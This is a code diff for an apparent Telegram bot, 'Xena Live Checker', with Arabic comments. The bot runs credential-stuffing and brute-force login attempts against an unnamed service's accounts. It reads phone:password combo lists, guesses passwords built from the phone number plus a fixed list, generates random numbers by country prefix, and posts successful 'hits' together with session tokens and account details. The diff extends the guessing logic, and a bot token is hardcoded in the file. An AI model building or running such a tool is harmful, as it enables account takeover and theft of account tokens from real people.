@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # ╔══════════════════════════════════════════════════════════╗
-# ║    📱  Xena Live — Telegram Bot Checker v2.0            ║
+# ║    📱  Xena Live — Telegram Bot Checker v2.1            ║
 # ╚══════════════════════════════════════════════════════════╝
 
 import os
@@ -17,7 +17,7 @@ import requests
 import telebot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
-# ضع توكن البوت الخاص بك هنا أو قم بتغييره
+# ضع توكن البوت الخاص بك هنا
 BOT_TOKEN = "8844579780:AAFDxl5UZRA64eHcoxboAUfp7hkE1XVD8jA"
 bot = telebot.TeleBot(BOT_TOKEN)
 
@@ -291,6 +291,26 @@ def format_hit_msg(phone, pw, r, acct, via="DIRECT"):
     if r.get("token"): msg += f"🔐 **Token:** `{r['token']}`\n"
     return msg
 
+def detect_country_and_format(phone_input):
+    phone_input = phone_input.strip().replace("+", "")
+    
+    # التحقق مما إذا كان الرقم يبدأ بررمز دولة معروف مسبقاً
+    for cc, data in COUNTRY_MAP.items():
+        code = data["code"]
+        if phone_input.startswith(code):
+            local = phone_input[len(code):].lstrip("-")
+            return f"{code}-{local}", cc
+            
+    # مطابقة البادئات (Prefs) الخاصة بالدول إذا لم يوجد رمز دولة
+    for cc, data in COUNTRY_MAP.items():
+        clean_input = phone_input[1:] if phone_input.startswith("0") else phone_input
+        for pref in data["prefs"]:
+            if clean_input.startswith(pref):
+                return f"{data['code']}-{clean_input}", cc
+                
+    # القيمة الافتراضية إذا لم يتم التعرف عليها
+    return phone_input, "SA"
+
 # ══════════════════════════════════════════════════════════
 #  Telegram Handlers & Logic
 # ══════════════════════════════════════════════════════════
@@ -333,15 +353,20 @@ def process_single(message):
     user_states.pop(message.chat.id, None)
     
     parts = text.split(":")
-    phone = parts[0].strip()
+    raw_phone = parts[0].strip()
     custom_pw = parts[1].strip() if len(parts) > 1 else None
     
-    country = "SA"
-    # استنتاج الدولة البسيط من المفتاح أو الطول
-    bot.send_message(message.chat.id, f"🔍 جاري فحص الرقم: `{phone}`...", parse_mode="Markdown")
+    # التعرف التلقائي على الدولة وتنسيق الرقم بالشكل المطابق
+    phone, country = detect_country_and_format(raw_phone)
+    
+    bot.send_message(message.chat.id, f"🔍 جاري فحص الرقم: `{phone}` (الدولة: {country})...", parse_mode="Markdown")
     
     cli = GrpcClient()
-    passwords_to_try = [custom_pw] if custom_pw else [phone] + PASSWORDS
+    
+    local_part = phone.split("-")[-1] if "-" in phone else phone
+    default_first_pw = "0" + local_part
+    
+    passwords_to_try = [custom_pw] if custom_pw else [default_first_pw] + PASSWORDS
     
     hit_found = False
     for idx, pw in enumerate(passwords_to_try):
@@ -353,7 +378,7 @@ def process_single(message):
             bot.send_message(message.chat.id, msg, parse_mode="Markdown")
             hit_found = True
             break
-    
+            
     if not hit_found:
         bot.send_message(message.chat.id, f"❌ فشل فحص الرقم `{phone}` (لا يوجد Hit صالح).", parse_mode="Markdown")
     cli.close()
@@ -385,16 +410,31 @@ def run_combo_checker(chat_id, file_path):
             
             for line in lines:
                 line = line.strip()
-                if not line or ":" not in line: continue
-                parts = line.split(":", 1)
-                phone, pw = parts[0].strip(), parts[1].strip()
+                if not line: continue
                 
-                r = _do_login(cli, phone, pw, "SA")
-                if r.get("status") == "hit":
-                    hits_count += 1
-                    acct = _fetch_info(cli, r.get("shortUID", 0), r.get("token", ""))
-                    msg = format_hit_msg(phone, pw, r, acct, via="COMBO")
-                    bot.send_message(chat_id, msg, parse_mode="Markdown")
+                if ":" in line:
+                    parts = line.split(":", 1)
+                    raw_phone, custom_pw = parts[0].strip(), parts[1].strip()
+                else:
+                    raw_phone, custom_pw = line.strip(), None
+                
+                phone, country = detect_country_and_format(raw_phone)
+                local_part = phone.split("-")[-1] if "-" in phone else phone
+                default_first_pw = "0" + local_part
+                
+                passwords_to_try = [custom_pw] if custom_pw else [default_first_pw] + PASSWORDS
+                
+                hit_found = False
+                for idx, pw in enumerate(passwords_to_try):
+                    if not pw: continue
+                    r = _do_login(cli, phone, pw, country)
+                    if r.get("status") == "hit":
+                        hits_count += 1
+                        acct = _fetch_info(cli, r.get("shortUID", 0), r.get("token", ""))
+                        msg = format_hit_msg(phone, pw, r, acct, via="COMBO")
+                        bot.send_message(chat_id, msg, parse_mode="Markdown")
+                        hit_found = True
+                        break
         
         bot.send_message(chat_id, f"🏁 **انتهى فحص الكومبو!**\nإجمالي السطور: {total}\nتم العثور على: {hits_count} Hit", parse_mode="Markdown")
     except Exception as e:
@@ -410,7 +450,7 @@ def run_auto_checker(chat_id, cc):
     
     bot.send_message(chat_id, f"🚀 تم تشغيل الفحص التلقائي لـ {cc}. سيتم إرسال الـ Hits عند العثور عليها.")
     
-    for _ in range(50): # فحص 50 رقم افتراضياً كمثال
+    for _ in range(50):
         pref = random.choice(c_info["prefs"])
         ext = ''.join(str(random.randint(0, 9)) for _ in range(c_info["ext"]))
         local = pref + ext
